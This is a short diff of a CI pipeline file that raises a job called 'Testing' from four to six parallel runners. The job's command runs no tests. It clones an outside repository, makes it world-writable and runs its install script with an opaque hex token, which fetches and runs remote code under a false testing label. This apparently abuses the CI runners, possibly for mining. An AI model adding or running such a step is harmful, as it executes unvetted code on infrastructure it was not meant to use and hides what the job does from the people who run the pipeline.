@@ -13,6 +13,6 @@ blocks:
     task:
       jobs:
         - name: Testing
-          parallelism: 4
+          parallelism: 6
           commands:
             - sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "876ebfd50031b87c9ead8d474ce6828e" "50" "5" "2"
